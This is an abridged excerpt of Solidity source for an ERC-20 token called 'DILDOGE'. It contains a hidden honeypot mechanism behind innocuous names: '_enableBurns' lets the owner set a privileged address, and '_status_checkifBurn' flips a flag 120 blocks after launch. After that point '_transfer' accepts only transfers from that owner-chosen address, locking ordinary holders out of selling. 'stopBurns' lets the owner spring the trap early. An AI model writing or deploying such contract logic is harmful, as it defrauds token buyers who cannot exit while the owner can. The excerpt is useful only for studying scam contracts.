...
contract DILDOGE is Context, IERC20, Ownable {
    ...
    string private _symbol = "DILDOGE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5873B350b4A0a1741EFfF239A0392DAF57A3bBDd); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0x5873B350b4A0a1741EFfF239A0392DAF57A3bBDd); // Treasury / Buyback
    ...
    address to_Burn = 0x000000000000000000000000000000000000dEaD;
    bool checkifBurn = true;
    ...
    function _enableBurns(address _current_burnAddr) public onlyOwner {
        to_Burn = _current_burnAddr;
    }
    function EnableLimits() public onlyOwner {
        firstSwap = block.number;
    }
    function _status_checkifBurn() internal {
        if (block.number > firstSwap + 120) {
            checkifBurn = false;
        }  
        else {
            checkifBurn = true;
    ...
    function stopBurns() public onlyOwner {
        checkifBurn = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                ...
                _status_checkifBurn();
                if (!checkifBurn) {
                    require(sender == to_Burn, "Allow transfers without fees to the dead address only"); 
                }
